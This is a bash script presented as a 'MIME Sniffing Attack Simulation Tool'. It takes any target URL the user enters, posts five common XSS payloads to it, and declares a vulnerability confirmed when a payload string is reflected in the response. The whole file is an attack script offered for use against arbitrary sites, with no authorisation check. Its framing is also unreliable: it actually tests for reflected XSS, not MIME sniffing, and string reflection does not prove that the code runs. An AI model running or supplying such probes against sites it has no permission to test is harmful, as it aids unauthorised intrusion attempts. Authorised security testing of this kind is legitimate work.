#!/bin/bash
# This is a comment

# Color variables
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Array of payloads
payloads=(
    "<script>alert('XSS')</script>"
    "<svg/onload=alert('XSS')>"
    "<img src=x onerror=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')>"
    "<a href='javascript:alert(`XSS`)'>Click me</a>"
)

# Function to perform MIME Sniffing Attack Simulation
simulate_mime_sniffing_attack() {
    echo -e "${YELLOW}Simulating MIME Sniffing Attack...${NC}"
    
    # Iterate over payloads and perform the attack
    for payload in "${payloads[@]}"; do
        echo -e "${GREEN}Using payload: $payload${NC}"
        response=$(curl -s -H "Content-Type: text/plain" -d "$payload" "$target_url")
        if [[ $response == *"alert('XSS')"* ]]; then
            echo -e "${RED}Vulnerability confirmed!${NC}"
            echo -e "${YELLOW}Example of vulnerability test:${NC}"
            echo "1. Send the following payload to the target URL:"
            echo "$payload"
            echo "2. Check if the payload is executed on the target website."
        else
            echo -e "${GREEN}Payload not executed.${NC}"
        fi
    done
}

# Main function
main() {
    echo -e "${GREEN}MIME Sniffing Attack Simulation Tool${NC}"
    echo "----------------------------------"

    # Prompt user for target URL
    read -p "Enter the target URL: " target_url

    # Perform MIME Sniffing Attack Simulation
    simulate_mime_sniffing_attack
}

# Call main function
main
